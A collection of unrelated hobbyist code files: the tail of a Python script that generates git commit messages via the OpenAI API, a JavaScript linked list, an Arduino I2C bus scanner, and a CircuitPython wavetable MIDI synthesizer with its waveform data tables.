        are not significant. Instead, enclose the mentioned class within backticks (`) to create a Markdown code snippet.
      - When using a method, or field name, always remember to enclose it in ` / ` (backticks) to create a Markdown code snippet.
      - If there's a mention of a method, remember to suffix its name with the `()`, as how it's done in C#.
      - Please exclude files with the .meta extension, as they are Unity helper files and can be disregarded in the commit message.
      """"""
  },
  {
 ""role"": ""user"",
 ""content"": format(result.stdout)
  },
]


response = client.chat.completions.create(
 # model=""gpt-3.5-turbo-16k"",
 model=""gpt-4-1106-preview"",
 messages=prompt_messages,
 temperature=0.5,
 max_tokens=256,
 top_p=1,
 frequency_penalty=0.5,
 presence_penalty=0
)


commit_message = response.choices[0].message.content.strip()


print(commit_message)


# Copy the commit message to clipboard
clipboard.copy(commit_message)
==<SEPERATOR>==
js_linked_list.js
// Construct Single Node
class Node {
 constructor(data, next = null) {
 this.data = data;
 this.next = next;
 }
}


// Create/Get/Remove Nodes From Linked List
class LinkedList {
 constructor() {
 this.head = null;
 this.size = 0;
 }


 // Insert first node
 insertFirst(data) {
 this.head = new Node(data, this.head);
 this.size++;
 }


 // Insert last node
 insertLast(data) {
 let node = new Node(data);
 let current;


 // If empty, make head
 if (!this.head) {
 this.head = node;
 } else {
 current = this.head;


 while (current.next) {
 current = current.next;
 }


 current.next = node;
 }


 this.size++;
 }


 // Insert at index
 insertAt(data, index) {
 //  If index is out of range
 if (index > 0 && index > this.size) {
 return;
 }


 // If first index
 if (index === 0) {
 this.insertFirst(data);
 return;
 }


 const node = new Node(data);
 let current, previous;


 // Set current to first
 current = this.head;
 let count = 0;


 while (count < index) {
 previous = current; // Node before index
 count++;
 current = current.next; // Node after index
 }


 node.next = current;
 previous.next = node;


 this.size++;
 }


 // Get at index
 getAt(index) {
 let current = this.head;
 let count = 0;


 while (current) {
 if (count == index) {
 console.log(current.data);
 }
 count++;
 current = current.next;
 }


 return null;
 }


 // Remove at index
 removeAt(index) {
 if (index > 0 && index > this.size) {
 return;
 }


 let current = this.head;
 let previous;
 let count = 0;


 // Remove first
 if (index === 0) {
 this.head = current.next;
 } else {
 while (count < index) {
 count++;
 previous = current;
 current = current.next;
 }


 previous.next = current.next;
 }


 this.size--;
 }


 // Clear list
 clearList() {
 this.head = null;
 this.size = 0;
 }


 // Print list data
 printListData() {
 let current = this.head;


 while (current) {
 console.log(current.data);
 current = current.next;
 }
 }
}


const ll = new LinkedList();


ll.insertFirst(100);
ll.insertFirst(200);
ll.insertFirst(300);
ll.insertLast(400);
ll.insertAt(500, 3);


// ll.clearList();
// ll.getAt(2);


ll.printListData();
"
"i2c_address_scanner_arduino_esp8266.cpp
","

// --------------------------------------
// i2c_scanner
//
// Version 1
//    This program (or code that looks like it)
//    can be found in many places.
//    For example on the Arduino.cc forum.
//    The original author is not know.
// Version 2, Juni 2012, Using Arduino 1.0.1
//     Adapted to be as simple as possible by Arduino.cc user Krodal
// Version 3, Feb 26  2013
//    V3 by louarnold
// Version 4, March 3, 2013, Using Arduino 1.0.3
//    by Arduino.cc user Krodal.
//    Changes by louarnold removed.
//    Scanning addresses changed from 0...127 to 1...119,
//    according to the i2c scanner by Nick Gammon
//    http://www.gammon.com.au/forum/?id=10896
// Version 5, March 28, 2013
//    As version 4, but address scans now to 127.
//    A sensor seems to use address 120.
// Version 6, November 27, 2015.
//    Added waiting for the Leonardo serial communication.
// 
//
// This sketch tests the standard 7-bit addresses
// Devices with higher bit address might not be seen properly.
//


#include <Wire.h>




void setup()
{
  Wire.begin(); // Arduino
 // Wire.begin(0, 2); // ESP8266


  Serial.begin(9600);
 while (!Serial);             // Leonardo: wait for serial monitor
  Serial.println(""\nI2C Scanner"");
}




void loop()
{
  byte error, address;
 int nDevices;


  Serial.println(""Scanning..."");


  nDevices = 0;
 for(address = 1; address < 127; address++ ) 
  {
 // The i2c_scanner uses the return value of
 // the Write.endTransmisstion to see if
 // a device did acknowledge to the address.
    Wire.beginTransmission(address);
    error = Wire.endTransmission();


 if (error == 0)
    {
      Serial.print(""I2C device found at address 0x"");
 if (address<16) 
        Serial.print(""0"");
      Serial.print(address,HEX);
      Serial.println(""  !"");


      nDevices++;
    }
 else if (error==4) 
    {
      Serial.print(""Unknown error at address 0x"");
 if (address<16) 
        Serial.print(""0"");
      Serial.println(address,HEX);
    }    
  }
 if (nDevices == 0)
    Serial.println(""No I2C devices found\n"");
 else
    Serial.println(""done\n"");


 delay(5000);           // wait 5 seconds for next scan
}
==<SEPERATOR>==
wavetable_synthio_synth.py
#
# wavetable_synthio_synth.py -- Demonstrate new synthio.Synthesizer as wavetable MIDI synth
# 15 Apr 2023 - @todbot / Tod Kurt
# video demo: https://www.youtube.com/watch?v=uUnS3nR2K-8
#
# Hooked up to generic I2S DAC
# Uses two pots:
#  knobA - selects the base wave
#  knobB - selects the mix between base wave and next wave
#


import time
import board
import analogio
import audiobusio, audiomixer
import synthio
import ulab.numpy as np
import usb_midi
import adafruit_midi
from adafruit_midi.note_on import NoteOn
from adafruit_midi.note_off import NoteOff
import neopixel


#from waveforms_akwf_0018 import waveforms, waveforms_names
from waveforms_akwf_granular import waveforms, waveforms_names
num_waveforms = len(waveforms)


SAMPLE_RATE = 28000 # clicks @ 36kHz & 48kHz on rp2040
SAMPLE_SIZE = len(waveforms[0])
VOLUME = 4000


# pimoroni pico dv board
# lck_pin, bck_pin, dat_pin  = board.GP28, board.GP27, board.GP26
# qtpy rp2040 SPI pins
lck_pin, bck_pin, dat_pin = board.MISO, board.MOSI, board.SCK
knobA_pin = board.A1
knobB_pin = board.A2


# map s range a1-a2 to b1-b2
def map_range(s, a1, a2, b1, b2):  return b1 + ((s - a1) * (b2 - b1) / (a2 - a1))


# mix between values a and b, works with numpy arrays too, t ranges 0-1
def lerp(a, b, t):  return (1-t)*a + t*b


def make_amp_envelope(velocity=127):
 max_time = 200 # let's declare we have this many units of time to use
 attack_time = int(map_range(velocity, 0,127, 99, 50)) # allow 50-99 units for attack, hard vel=faster attack
 release_time = int(map_range(velocity, 0,127, 50, 99)) # allow 50-99 units for release
 sustain_time = max_time - attack_time - release_time # sustain gets remainder (sustain by synth, not env)
 print(""sustain_time:"",sustain_time)
 peak_level = 1 # or map_range(velocity, 0,127, 0.3,1)
 adsr = np.array( np.concatenate((
 np.linspace(.1, peak_level, num=attack_time, endpoint=False),
 np.linspace(peak_level, peak_level, num=sustain_time, endpoint=False),  # filler
 np.linspace(peak_level, 0, num=release_time, endpoint=True)**2,  # exp decay
            )) * 32767, dtype=np.int16 )
 return (adsr, 100+sustain_time)  # FIXME: has to be longest possible attack time




# synth engine setup
(amp_env,hold_index) = make_amp_envelope(10)
print(""hold_index:"", hold_index, ""amp_env:"", list(amp_env))


waveform = np.zeros(SAMPLE_SIZE, dtype=np.int16)  # intially all zeros (silence)
synth = synthio.Synthesizer(sample_rate=SAMPLE_RATE, waveform=waveform,
 envelope=amp_env, envelope_sustain_index=hold_index )


audio = audiobusio.I2SOut(bit_clock=bck_pin, word_select=lck_pin, data=dat_pin)
mixer = audiomixer.Mixer(voice_count=1, sample_rate=SAMPLE_RATE, channel_count=1,
 bits_per_sample=16, samples_signed=True, buffer_size=2048 )
audio.play(mixer)
mixer.voice[0].play(synth)


midi = adafruit_midi.MIDI(midi_in=usb_midi.ports[0], in_channel=0 )


# waveforms setup
saw = np.linspace(VOLUME, -VOLUME, num=SAMPLE_SIZE, dtype=np.int16)
sine = np.array(np.sin(np.linspace(0, 2*np.pi, SAMPLE_SIZE, endpoint=False)) * VOLUME, dtype=np.int16)
waveform[:] = saw


# knob & LED setup
led = neopixel.NeoPixel(board.NEOPIXEL, 1, brightness=0.2)
knobA = analogio.AnalogIn(knobA_pin)
knobB = analogio.AnalogIn(knobB_pin)
knobA_val = knobA.value
knobB_val = knobB.value
knob_filt = 0.8 # simple low-pass filter on noisy knobs
wave_index = 0
wave_mix = 0
last_debug_time = time.monotonic()


print(""wavetable_synthio_synth ready"")


while True:
 # handle midi
 msg = midi.receive()
 if isinstance(msg, NoteOn) and msg.velocity != 0:
 print(""noteOn: "", msg.note)
 led.fill(0xff00ff)
        (amp_env[:], hold_i ) = make_amp_envelope(msg.velocity)
 synth.press( (msg.note,) )
 elif isinstance(msg,NoteOff) or isinstance(msg,NoteOn) and msg.velocity==0:
 print(""noteOff:"", msg.note)
 led.fill(0x00000)
 synth.release_then_press( release=(msg.note,), press=() ) # no "".release()""


 # handle knobs
 knobA_val = knob_filt * knobA_val + (1-knob_filt)* knobA.value
 knobB_val = knob_filt * knobB_val + (1-knob_filt)* knobB.value
 wave_index = int((num_waveforms-1) * knobA_val // 65535)  # map knobA_val to wavetable index
 wave_mix = 1.0 * knobB_val / 65535
 waveform[:] = lerp( waveforms[wave_index], waveforms[wave_index+1], wave_mix )


 # debug info
 if time.monotonic() - last_debug_time > 0.5:
 last_debug_time = time.monotonic()
 print(""wave_index:"",wave_index,""wave_mix:"",wave_mix)
#
# generated by 'wavsmash.py' by @todbot
# make smaller with mpy-cross
import ulab.numpy as np
waveforms = (
np.array((576,2212,3794,5382,6942,8468,9956,11408,12810,14160,15462,16707,17895,19025,20103,21103,22077,22817,23479,24091,24651,25169,25641,26067,26459,26811,27125,27407,27665,27891,28093,28269,28431,28573,28701,28805,28903,28997,29085,29163,29227,29299,29391,29473,29545,29623,29683,29611,29535,29455,29409,29415,29417,29395,29395,29457,29549,29611,29647,29737,29895,30043,30121,30189,30353,30573,30701,30723,30807,31055,31313,31323,31097,30963,32767,-8066,-15892,-15804,-15564,-15196,-14650,-14126,-13736,-13386,-12952,-12454,-12008,-11630,-11240,-10792,-10330,-9922,-9544,-9128,-8668,-8228,-7828,-7434,-6994,-6528,-6100,-5702,-5280,-4808,-4338,-3918,-3510,-3038,-2524,-2046,-1628,-1182,-638,-82,386,810,1332,1968,2546,2984,3454,4124,4866,5410,5796,6386,7288,8120,8490,8692,9582,11238,15318,-24339,-27233,-28163,-27729,-26667,-25945,-25807,-25691,-25169,-24465,-24037,-23853,-23561,-23047,-22567,-22323,-22157,-21865,-21493,-21237,-21137,-21027,-20813,-20613,-20541,-20535,-20467,-20355,-20297,-20321,-20341,-20305,-20259,-20263,-20291,-20283,-20233,-20187,-20161,-20111,-20021,-19897,-19767,-19615,-19419,-19181,-18907,-18601,-18241,-17831,-17373,-16855,-16276,-15636,-14820,-13956,-13022,-12028,-10988,-9922,-8782,-7574,-6326,-5054,-3746,-2390,-1000,), dtype=np.int16), 
np.array((36,1316,2893,4681,6644,8775,11039,13322,15572,17800,19937,21864,23629,25058,26149,26927,22473,18651,20133,21413,22532,23643,24287,24612,24867,25223,25692,26088,26519,27172,27971,28086,28316,28824,29067,28994,29366,30060,29782,27759,-15251,-11919,-10284,-9752,-9279,-8279,-7329,-6701,-5976,-5040,-4222,-3515,-2674,-1750,-944,-134,840,1831,2682,3631,4849,5964,6592,8584,-28637,-27495,-26783,-26297,-25560,-24681,-23978,-23361,-22676,-22065,-21638,-21277,-20940,-20704,-20546,-20369,-20180,-19689,-19023,-18265,-17404,-16322,-14955,-17347,-17437,-16279,-14341,-12132,-9918,-7593,-5172,-2851,-694,1330,3052,4985,6632,8058,9232,10140,10889,11502,11969,12337,12678,13011,13324,13671,14151,14711,15318,16092,17071,18068,19104,20363,21669,22753,23858,25174,26234,26839,27727,29155,30251,3828,3757,4993,6452,7432,8267,9299,10288,11112,11939,12788,13574,14346,15101,15781,16502,17284,17891,18426,19220,20225,20781,21401,18468,-28982,-28245,-28452,-28322,-27786,-26835,-26005,-25022,-23972,-23137,-22390,-21537,-20712,-20093,-19084,-17904,-16732,-15592,-14236,-12650,-11212,-9886,-8034,-27376,-24504,-23216,-21982,-20168,-18251,-16553,-14825,-12973,-11291,-9855,-8503,-7268,-6287,-5495,-4782,-4195,-3736,-3312,-2881,-2461,-2000,-1441,-759,), dtype=np.int16), 
np.array((678,2282,3944,5604,7254,8874,10456,11987,13457,14851,16196,17468,18675,19810,20880,21885,22828,23707,24528,25295,26016,26694,27317,27886,28402,28887,29360,29812,30209,30535,30813,31094,31404,31700,31915,32021,32093,32225,32449,32657,32701,32583,31955,31458,31184,30851,30096,28937,27662,29854,-30789,-30441,-29466,-28735,-28575,-28787,-28967,-28891,-28591,-28286,-28108,-28020,-27904,-27658,-27309,-26959,-26652,-26360,-26026,-25607,-25131,-24640,-24158,-23643,-23082,-22456,-21787,-21080,-20345,-19562,-18723,-17828,-16881,-15880,-14831,-13737,-12578,-11363,-10101,-8796,-7456,-6087,-4701,-3311,-1932,-576,740,2006,3125,4152,5137,6077,6968,7807,8601,9348,10049,10704,11323,11895,12428,12928,13393,13822,14218,14580,14913,15217,15487,15734,15956,16154,16328,16475,16607,16721,16819,16893,16945,16985,17021,17047,17059,17045,17011,16973,16941,16915,16873,16787,16673,16577,16525,16487,16405,16461,11477,12001,12534,13075,13505,13673,13669,14100,-7538,-16741,-16905,-16969,-17256,-17782,-18365,-18841,-19190,-19486,-19835,-20263,-20704,-21078,-21372,-21639,-21925,-22233,-22516,-22740,-22900,-23026,-23134,-23224,-23260,-23226,-23118,-22950,-22726,-22426,-22037,-21550,-20956,-20263,-19454,-18513,-17444,-16230,-14879,-13375,-11733,-9949,-8031,-5994,-3854,-1653,), dtype=np.int16), 
np.array((238,1151,2267,1360,2735,4106,5490,6867,8286,9458,10626,11768,12831,13712,14537,15314,15880,16375,16831,17252,17650,18027,18392,18760,19123,19496,19881,20283,20698,21134,21573,21951,22898,8581,9974,10833,11701,12566,13421,14266,15095,15902,16691,17455,18204,18926,19627,20311,20981,21643,22294,22936,23578,24218,24860,25505,26153,26805,27449,28069,28633,28633,24066,4647,6247,7315,8380,9450,10517,11575,12617,13638,14619,15591,16534,17433,18332,19067,19779,20471,21033,21326,21613,21888,22063,22231,22406,22587,22771,22958,23131,22850,82,-14419,-13771,-13086,-12370,-11621,-10865,-10058,-9229,-8380,-7511,-6624,-5725,-4814,-3889,-2956,-2016,-1073,-148,790,1729,2663,3588,4501,5410,6311,7218,8167,9309,13096,-25567,-24467,-24108,-23654,-23219,-22795,-22374,-21957,-21539,-21112,-20676,-20225,-19765,-19283,-18786,-18270,-17738,-17184,-16616,-16034,-15440,-14826,-14262,-13468,-12683,-11902,-11035,-9954,-9042,-7435,-29625,-27843,-26950,-26061,-25176,-24295,-23414,-22531,-21643,-20754,-19843,-18910,-17963,-16990,-15994,-14975,-13929,-12863,-11780,-10678,-9566,-8446,-7345,-6237,-5153,-4091,-3072,-2121,-1418,-2723,-9193,-8501,-8003,-7529,-7096,-6660,-6239,-5821,-5406,-4983,-4543,-4081,-3588,-3060,-2490,-1874,-1214,-507,), dtype=np.int16), 
np.array((192,1234,2272,3305,4333,5347,6349,7340,8314,9270,10211,11119,12015,12891,13742,14572,15374,16152,16907,17631,18333,19007,19660,20282,20872,21446,21994,22518,23021,23497,23955,24383,24797,25187,25553,25907,26230,26548,26840,27114,27382,27616,27860,28064,28266,28460,28618,28792,28930,29064,29196,29292,29416,29487,29579,29653,29701,29779,29799,29853,29879,29887,29925,29901,29927,29907,29885,29891,29823,29835,29769,29727,29705,29603,29599,29493,29442,29386,29256,29248,29094,29046,28960,28804,28800,28588,28560,28436,28248,28298,27948,28032,27856,27384,28300,24421,11413,13320,12997,12923,13376,13035,13446,13364,13025,15192,-24827,-28638,-27784,-28252,-28458,-28348,-28676,-28632,-28798,-28916,-28990,-29338,-29436,-29693,-29891,-30031,-30301,-30413,-30645,-30809,-30959,-31181,-31285,-31497,-31631,-31771,-31953,-32043,-32223,-32321,-32443,-32579,-32645,-32767,-32571,-32425,-32265,-32065,-31913,-31691,-31503,-31295,-31059,-30855,-30593,-30363,-30097,-29823,-29559,-29250,-28964,-28642,-28318,-27992,-27630,-27268,-26846,-26566,-26254,-25909,-25561,-25181,-24787,-24371,-23927,-23473,-22981,-22474,-21940,-21378,-20806,-20192,-19559,-18897,-18209,-17491,-16749,-15980,-15186,-14366,-13518,-12649,-11755,-10853,-9917,-8960,-7988,-6998,-5993,-4979,-3955,-2918,-1882,-838,), dtype=np.int16), 
np.array((92,2165,4474,6735,8936,11060,13087,15008,16815,18490,20065,21523,22862,24093,25213,26232,27156,27987,28731,29394,29974,30484,30928,31331,31683,31989,32239,32267,32115,31917,31697,31477,31257,31015,30732,30376,29948,29486,29033,28635,28303,27995,27633,27156,26542,25854,25201,24715,24467,24451,24541,24317,20403,-25053,-23100,-23588,-24261,-24823,-25179,-25313,-25331,-25311,-25337,-25445,-25610,-25774,-25890,-25932,-25912,-25852,-25784,-25724,-25656,-25568,-25441,-25257,-25023,-24743,-24423,-24063,-23663,-23204,-22690,-22104,-21445,-20723,-19918,-19030,-18059,-16997,-15844,-14598,-13255,-11816,-10293,-8684,-6997,-5250,-3477,-1644,200,2045,3866,5655,7390,9056,10647,12154,13571,14890,16104,17239,18280,19234,20099,20889,21599,22238,22808,23320,23767,24163,24511,24805,25057,25275,25453,25594,25704,25786,25840,25866,25868,25848,25802,25736,25654,25558,25447,25327,25193,25037,24853,24645,24315,24369,24447,24531,24587,24601,24529,23975,-17057,-25496,-26514,-27202,-27755,-28213,-28621,-29019,-29430,-29856,-30298,-30728,-31129,-31495,-31819,-32113,-32389,-32645,-32715,-32647,-32537,-32375,-32171,-31915,-31613,-31261,-30858,-30396,-29868,-29262,-28583,-27819,-26970,-26028,-25007,-23863,-22614,-21251,-19772,-18173,-16457,-14624,-12676,-10631,-8492,-6277,-4000,-1724,), dtype=np.int16), 
np.array((198,2776,5441,8031,10454,12653,14609,16333,17824,19130,20260,21227,22043,22721,23269,23699,24019,24243,24385,24461,18630,-26956,-28048,-29175,-30249,-31227,-32073,-32631,-32359,-31817,-30941,-29663,-27900,-25596,-22591,-18834,-14291,-9016,-3212,2794,8624,13943,18544,22353,25408,27780,29553,30855,31751,32315,32611,32687,32593,32351,31983,31491,30871,30097,28895,-28240,-30489,-31343,-31975,-32431,-32697,-32767,-32615,-32217,-31525,-30489,-29035,-27090,-24519,-21237,-17178,-12339,-6829,-902,5081,10748,15805,20102,23615,26396,28510,30109,31245,31995,31955,31437,30729,29887,28943,27908,26784,25560,24077,22781,-22207,-22735,-22709,-22471,-22065,-21497,-20773,-19896,-18872,-17698,-16361,-14857,-13141,-11206,-9054,-6717,-4259,-1796,522,2548,4167,5339,6079,6445,6503,6319,5949,5449,4847,4183,3480,2756,2028,1304,590,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,-478,-1168,-1882,-2596,-3336,-4074,-4795,-5487,-6119,-6669,-7095,-7357,-7399,-7157,-6559,-5543,-4076,-2132,), dtype=np.int16), 
np.array((1099,5307,9366,12884,15846,18248,20157,21654,22796,23589,24168,24427,24351,-27001,-28666,-30491,-31954,-32615,-31934,-30385,-27741,-23615,-17653,-9745,-458,8899,16976,23128,27416,30167,31782,32605,32747,32379,31888,30670,29590,-30666,-31109,-32305,-32655,-32705,-32265,-30972,-28746,-25140,-19803,-12502,-3548,5952,14559,21353,26212,29430,31393,32126,31409,30061,28312,26817,24244,17981,-23557,-22575,-22179,-21069,-19720,-18096,-15946,-13355,-10204,-6551,-2624,1059,3938,5712,6459,6423,5868,5010,3942,2810,1640,504,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,-1071,-2225,-3410,-4564,-5666,-6585,-7232,-7411,-6868,-5331,-2620,), dtype=np.int16), 
np.array((858,4110,7420,10743,14037,17246,20330,23202,25889,28307,30133,31401,32263,32707,32729,32327,31511,30281,28663,26679,24372,21728,18802,15633,12265,8735,5092,1384,-2340,-6036,-9653,-13143,-16466,-19540,-22404,-24973,-27219,-29117,-30633,-31759,-32471,-32764,-32633,-32083,-31117,-29767,-28015,-25907,-23460,-20708,-17692,-14447,-11015,-7440,-3768,-50,3670,7342,10879,14317,17570,20598,23358,25819,27941,29705,31085,32061,32625,32766,32485,31793,30685,29183,27299,25063,22506,19658,16554,13233,9747,6130,2438,-1240,-4952,-8597,-12131,-15507,-18684,-21618,-24276,-26617,-28617,-30245,-31479,-32313,-32717,-32207,-31289,-29987,-28331,-26349,-24084,-21576,-18868,-15999,-13019,-9973,-6900,-3888,-902,1982,4726,7298,9669,11807,13691,15315,16656,17708,18466,18934,19116,19032,18684,18094,17282,16265,15081,13749,12301,10763,9167,7538,5934,4332,2780,1308,-66,-1328,-2458,-3448,-4280,-4962,-5478,-5812,-5884,-5696,-5268,-4622,-3776,-2772,-1632,-404,874,2174,3440,4640,5734,6682,7438,8050,8154,8118,7912,7540,6986,6258,5354,4276,3034,1644,142,-1496,-3230,-5036,-6880,-8741,-10585,-12383,-14101,-15705,-17172,-18462,-19550,-20400,-21012,-21352,-21402,-21148,-20576,-19692,-18494,-16980,-15163,-13059,-10689,-8078,-5288,-2286,), dtype=np.int16), 
np.array((366,2426,4476,6506,8489,10461,12393,14275,16099,17864,19556,21170,22700,24140,25487,26731,27869,28891,29677,30313,30821,31201,31453,31577,31573,31443,31189,30813,30319,29717,28999,28171,27237,26209,25085,23876,22582,21216,19778,18280,16726,15123,13497,11817,10113,8387,6646,4902,3158,1424,-294,-1988,-3654,-5286,-6874,-8399,-9887,-11317,-12685,-13981,-15203,-16353,-17418,-18400,-19292,-20098,-20812,-21424,-21948,-22378,-22712,-22948,-23090,-23134,-23088,-22948,-22716,-22398,-21992,-21506,-20946,-20304,-19588,-18808,-17958,-17054,-16091,-15081,-14025,-12929,-11797,-10643,-9453,-8339,-7176,-5988,-4774,-3540,-2294,-1040,222,1504,2802,4110,5424,6718,8024,9317,10593,11845,13069,14257,15405,16510,17562,18558,19492,20364,21152,21876,22520,23084,23562,23948,24244,24444,24548,24550,24456,24258,23962,23568,23068,22468,21770,20970,20080,19092,18016,16852,15605,14279,12879,11429,9895,8303,6654,4960,3228,1460,-332,-2148,-3976,-5808,-7640,-9463,-11245,-13025,-14773,-16482,-18140,-19748,-21292,-22766,-24168,-25487,-26715,-27851,-28887,-29805,-30627,-31333,-31921,-32385,-32725,-32767,-32679,-32461,-32117,-31643,-31047,-30337,-29497,-28541,-27473,-26297,-25015,-23634,-22162,-20602,-18958,-17240,-15455,-13607,-11731,-9785,-7798,-5782,-3744,-1690,), dtype=np.int16), 
np.array((1520,7816,12352,14172,13434,11002,7926,5020,2732,1196,358,40,0,-64,-476,-1572,-3616,-6860,-11228,-16184,-20507,-22373,-19963,-12542,-1308,10750,20213,24887,24603,20849,15466,10120,5756,2712,942,170,2,-32,-440,-1738,-4396,-8766,-14796,-22079,-28919,-32617,-30793,-22037,-7438,9278,23363,31339,32433,28267,21567,14476,8514,4238,1638,386,20,-4,-234,-1170,-3224,-6676,-11554,-17351,-23123,-26969,-26763,-21075,-10314,2930,14886,22451,24529,22111,17221,11804,7170,3722,1560,446,50,0,-66,-476,-1506,-3346,-6050,-9444,-12972,-15640,-16286,-13880,-8350,-906,6348,11432,13410,12606,10112,7106,4396,2382,1062,348,58,0,-8,-122,-450,-1068,-1976,-3100,-4248,-5106,-5304,-4590,-2988,-920,972,2160,2470,2110,1446,798,336,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,148,638,1168,1496,1518,1300,946,578,280,90,10,0,528,1640,2628,3166,3148,2696,2010,1296,702,294,74,2,-2,-60,-320,-940,-2078,-3832,-6112,-8646,-10678,-11200,-9300,-4766,), dtype=np.int16), 
np.array((1240,5150,9200,13278,17273,21019,24507,27587,30165,31831,32621,32728,32155,30927,29085,26681,23785,20469,16869,12982,8948,4868,836,-3064,-6746,-10116,-13114,-15704,-17817,-19385,-20441,-21003,-20999,-20395,-19441,-20667,-27217,-25143,-24475,-24647,-24501,-23643,-22267,-20523,-18317,-15602,-12404,-8784,-4792,-526,3894,8348,12722,16895,20755,24201,27115,29497,31257,32351,32766,32495,31559,29985,27829,25145,22005,18495,14704,10774,6704,2636,-1332,-5122,-8642,-11818,-14596,-16925,-18747,-20037,-20815,-21063,-20747,-19921,-18867,-26583,-25697,-24171,-23641,-23319,-22375,-20907,-19091,-16961,-14518,-11718,-8638,-5358,-1956,1466,4806,7970,10876,13450,15630,17375,18659,19459,19801,19689,19149,18223,16961,15416,13652,11726,9706,7650,5616,3682,1846,170,-1308,-2570,-3604,-4400,-4956,-5284,-5404,-5330,-5090,-4714,-4248,-3696,-3950,-4258,-3484,-2998,-2600,-2150,-1668,-1190,-742,-348,10,0,0,0,0,0,0,54,260,614,1110,1720,2426,3182,3976,4756,5490,6134,6654,7022,7204,7184,6946,6484,5800,4898,3818,2552,1144,-366,-1950,-3550,-5118,-6618,-8006,-9218,-10224,-11014,-11540,-11734,-11634,-11412,-15822,-16523,-16088,-16361,-16897,-16979,-16593,-15846,-14740,-13216,-11198,-8712,-5778,-2434,), dtype=np.int16), 
np.array((236,1893,3629,5409,7192,8940,10612,12167,13564,14770,15742,16472,16917,20079,20795,20618,20630,20650,20346,19630,18548,17135,15397,13361,10984,8313,5383,2234,-1072,-4481,-7918,-11319,-14610,-17722,-20590,-23150,-25322,-27112,-28212,-28625,-28537,-27863,-32413,-31323,-29962,-28813,-27669,-26084,-24041,-21674,-18993,-16051,-12870,-9485,-5934,-2276,1428,5114,8710,12151,15371,18275,20881,23107,24915,26272,27162,27565,27408,32705,31978,31150,30487,29767,28573,26859,24737,22262,19464,16359,12986,9381,5605,1727,-2184,-6052,-9808,-13335,-16652,-19656,-22290,-24510,-26280,-27573,-28376,-28679,-28499,-28563,-32369,-30900,-29663,-28563,-27346,-25653,-23524,-21059,-18314,-15315,-12083,-8653,-5070,-1394,2264,5938,9507,12904,16067,18935,21460,23594,25306,26565,27360,27701,28891,32601,31080,29902,28843,27633,25957,23885,21518,18919,16119,13159,10072,6954,3785,661,-2352,-5206,-7848,-10229,-12311,-14069,-15478,-16530,-17219,-17554,-17550,-17219,-16576,-17398,-18013,-16562,-15454,-14453,-13367,-12087,-10674,-9183,-7651,-6120,-4573,-3054,-1587,-200,1076,2226,3228,4064,4727,5132,5246,5088,4675,4036,3208,2236,1687,923,-306,-1386,-2356,-3250,-5010,-6012,-6583,-7152,-7627,-7782,-7583,-7206,-6655,-5932,-5030,-3948,-2697,-1288,), dtype=np.int16), 
np.array((254,3954,7112,9816,12186,14290,16140,17747,19157,20423,21563,22555,23465,23685,24033,24435,24885,25369,25891,26443,27003,27563,28125,28687,29321,29763,30195,30497,30711,30907,31081,31241,31389,31525,31647,31759,31863,31957,32043,32123,32197,32263,32323,32377,32433,32483,32521,32555,32593,32635,32665,32685,32705,32738,32767,32717,32521,32345,32213,32107,32007,31933,31911,31911,31887,31835,31823,31877,32237,23893,17505,11850,7178,3318,122,-2638,-4982,-6934,-8552,-9916,-11078,-12048,-12838,-13482,-14014,-14450,-14790,-15036,-15214,-15344,-15422,-15442,-15418,-15358,-15274,-15158,-15006,-14832,-14642,-14436,-14212,-13962,-13700,-13438,-13164,-12868,-12558,-12250,-11946,-11626,-11284,-10940,-10616,-10286,-9928,-9556,-9200,-8866,-8516,-8126,-7726,-7380,-7078,-6754,-6322,-9672,-12156,-14480,-16503,-18223,-19701,-21005,-22157,-23157,-24039,-24843,-25573,-26181,-26669,-27129,-27785,-23913,-20949,-18303,-16118,-14386,-13042,-11962,-11060,-10336,-9800,-9422,-9130,-8912,-8778,-8734,-8752,-8800,-8882,-9014,-9190,-9386,-9594,-9820,-10080,-10358,-10640,-10930,-11234,-11558,-11888,-12216,-12548,-12898,-13254,-13610,-13958,-14314,-14690,-15066,-15430,-15792,-16168,-16561,-16945,-17309,-17677,-18073,-18479,-18849,-19199,-19581,-20013,-20435,-20769,-21007,-21459,-14152,-8812,-3950,), dtype=np.int16), 
np.array((243,869,1123,1095,1032,1088,1245,1491,1680,1648,1648,1660,2111,4591,4321,-539,-2836,-3093,-768,1839,3591,5044,5942,4514,380,110,4406,6725,4529,2153,1213,231,38,-124,-9696,-24796,-13305,-6898,-3419,-887,1572,3431,5541,11393,5636,6698,10734,10942,7202,3878,2433,1374,2679,2582,-404,-2850,-5412,-7012,-772,2332,1894,948,60,-883,-1608,-1473,-911,-1022,-1829,-2314,-2514,-3003,-2594,-4424,-18271,-32031,-15511,-6857,-2461,167,1783,2347,2232,2008,1958,2079,2256,2373,2210,2008,1906,1908,3071,3099,617,-660,-1072,-116,1231,1940,2230,2256,1880,889,591,1483,2840,3667,3367,3615,3611,3196,3492,-5144,-10859,-5535,-2932,-1511,-475,581,1543,2059,6759,3913,3538,3313,2508,1475,613,207,-40,58,161,-233,-575,-827,-1034,-462,-8,10,-46,-104,-163,-209,-185,-108,-82,-94,-94,-72,-50,-8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,-82,-187,-344,-402,-108,12,-8,-72,-152,-263,-360,-322,-233,-283,-436,-545,-615,-764,-668,-1584,-6982,-9704,-4722,-2179,-738,), dtype=np.int16), 
